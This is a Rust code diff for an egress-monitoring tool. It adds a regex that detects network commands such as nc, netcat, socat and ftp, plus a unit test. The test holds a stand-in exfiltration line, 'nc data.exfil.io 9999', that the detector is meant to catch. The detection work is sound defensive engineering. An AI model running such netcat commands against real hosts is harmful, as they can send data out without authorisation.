@@ -123,6 +123,24 @@ fn extract_destinations(command: &str) -> Vec<EgressDestination> {
         });
     }
 
+    static GENERIC_NET_CMD_RE: OnceLock<Regex> = OnceLock::new();
+    let generic_net_cmd_re = GENERIC_NET_CMD_RE.get_or_init(|| {
+        Regex::new(
+            r"(?i)\b(fetch|nc|ncat|netcat|ftp|sftp|socat|httpie|xh)\b[^\n]*?\b((?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]*[a-zA-Z0-9])?\.)+[a-zA-Z]{2,})\b"
+        ).unwrap()
+    });
+    let already_seen: HashSet<String> = destinations.iter().map(|d| d.domain.to_lowercase()).collect();
+    for cap in generic_net_cmd_re.captures_iter(command) {
+        let domain = cap[2].to_string();
+        if !already_seen.contains(&domain) {
+            destinations.push(EgressDestination {
+                kind: "generic_network".to_string(),
+                destination: cap[0].to_string(),
+                domain,
+            });
+        }
+    }
+
     static NPM_PUBLISH_RE: OnceLock<Regex> = OnceLock::new();
     let npm_publish_re = NPM_PUBLISH_RE
         .get_or_init(|| Regex::new(r"(?:^|[;&|]\s*|\n)\s*npm\s+publish(?:\s|$)").unwrap());
@@ -356,6 +374,22 @@ mod tests {
         assert_eq!(dests.len(), 1);
         assert_eq!(dests[0].kind, "docker_registry");
         assert_eq!(dests[0].domain, "ghcr.io");
+    }
+
+    #[test]
+    fn test_generic_network_catchall() {
+        let dests = extract_destinations("nc data.exfil.io 9999");
+        assert!(dests.iter().any(|d| d.kind == "generic_network"
+            && d.domain == "data.exfil.io"));
+
+        let dests = extract_destinations("curl https://example.com/api/data");
+        assert!(!dests.iter().any(|d| d.kind == "generic_network"));
+
+        let dests = extract_destinations("ssh user@bastion.example.com");
+        assert!(!dests.iter().any(|d| d.kind == "generic_network"));
+
+        let dests = extract_destinations("scp file.txt user@remote.example.com:/tmp/");
+        assert!(!dests.iter().any(|d| d.kind == "generic_network"));
     }
 
     #[test]
